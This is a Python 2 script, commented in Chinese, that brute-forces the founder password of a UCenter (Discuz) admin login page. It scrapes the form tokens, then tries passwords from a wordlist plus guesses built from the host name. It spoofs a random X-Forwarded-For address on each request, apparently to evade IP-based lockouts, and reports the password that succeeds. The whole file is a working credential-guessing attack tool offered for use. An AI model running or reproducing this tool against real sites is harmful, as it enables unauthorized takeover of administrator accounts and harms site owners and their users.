#coding:utf-8

import httplib,re,random,urllib,time,urllib2

from sys import argv





def getHtml(host,htmlhash,htmlpass,htmlseccode):

	ip=str(random.randint(1,100))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))

	postHead={"Host":host,"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0","X-Forwarded-For":ip,'Content-Type':'application/x-www-form-urlencoded','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Connection':'keep-alive'}

	postContent={'sid':'','formhash':htmlhash,'seccodehidden':htmlseccode,'iframe':'0','isfounder':'1','password':htmlpass,'seccode':'cccc','submit':'%E7%99%BB+%E5%BD%95'}

	url=host+'/uc_server/admin.php?m=user&a=login'
	print url
	req=urllib2.Request(url,urllib.urlencode(postContent),headers=postHead)
	    
	pageConect = urllib2.urlopen(req,timeout=30).read()

	return pageConect



#获取 formhash  和  seccodehidden

def gethashs(host):

	url=host+'/uc_server/admin.php'

	pageContent=urllib.urlopen(url).read()
	print pageContent

	r1=re.compile('<input type="hidden" name="formhash" value="(\S+)" />')

	htmlhash=r1.findall(pageContent)[0]


	r2=re.compile('<input type="hidden" name="seccodehidden" value="(\S+)" />')

	htmlseccode=r2.findall(pageContent)[0]

	return htmlhash+' '+htmlseccode



#通过argv获取 host 字典 间隔时间 进行爆破

if(len(argv)==1):

	print '---->python '+argv[0]+' host地址 字典文件 间隔时间'

	print '---->python '+argv[0]+' 192.168.1.105 pass.txt 0.2'

else:

	host=argv[1]

	passfile=argv[2]

	sleeptime=argv[3]

	print '网站host为  '+host

#取域名 然后添加一些密码 

	hostuser=host

	hostuser=hostuser[len(hostuser)-2]

	hostpass=[hostuser+'123',hostuser+'888',hostuser+hostuser,hostuser+'..',hostuser+'.',hostuser+'admin888',hostuser+'admin123',hostuser+'admin',hostuser+'123456']

	print '密码字典为  '+passfile

	print '间隔时间为  '+sleeptime

	print '--->'

	x=gethashs(host).split(' ')

	f=open(passfile,'r')

	htmlpass=f.read().split('\r\n')

	htmlpass=hostpass+htmlpass

	f.close()

	for i in range(len(htmlpass)):

		time.sleep(float(sleeptime))

		print '正在尝试密码'+htmlpass[i]

		if(getHtml(host,x[0],htmlpass[i],x[1])==''):

			print '密码为 '+htmlpass[i]

			break